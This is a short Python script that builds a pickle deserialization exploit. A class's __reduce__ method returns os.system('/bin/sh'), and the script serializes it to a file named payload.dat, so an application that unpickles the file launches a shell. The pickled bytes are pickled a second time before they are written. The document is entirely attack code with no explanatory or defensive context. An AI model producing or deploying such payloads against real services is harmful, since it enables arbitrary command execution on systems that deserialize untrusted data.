import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)

serialize_exploit()
